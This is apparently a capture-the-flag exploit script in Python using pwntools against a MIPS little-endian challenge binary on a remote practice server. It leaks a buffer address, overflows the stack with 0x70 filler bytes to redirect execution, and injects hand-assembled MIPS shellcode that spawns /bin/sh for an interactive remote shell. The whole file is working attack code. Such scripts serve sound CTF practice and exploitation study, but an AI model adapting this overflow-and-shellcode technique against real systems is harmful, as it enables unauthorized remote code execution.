#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.arch = "mips"
context.endian = "little"
context.log_level = "debug"
context.bits = 32

io = remote("pwn2.jarvisoj.com", 9889)

io.sendlineafter("help.\n", '2057561479')
io.recvuntil("0x")
buf_addr = int(io.recvuntil("\n", drop = True), 16)

payload = '1' * 0x70 + p32(buf_addr + 8)
io.sendline(payload)
io.recvuntil("\n")

shellcode = "\xff\xff\x10\x04\xab\x0f\x02\x24"
shellcode += "\x55\xf0\x46\x20\x66\x06\xff\x23"
shellcode += "\xc2\xf9\xec\x23\x66\x06\xbd\x23"
shellcode += "\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf"
shellcode += "\x9a\xf9\xbd\x23\x21\x20\x80\x01"
shellcode += "\x21\x28\xa0\x03\xcc\xcd\x44\x03"
shellcode += "/bin/sh"

payload = cyclic(8)
payload += shellcode

io.sendline(payload)
io.sendline('exit')

io.interactive()
io.close()
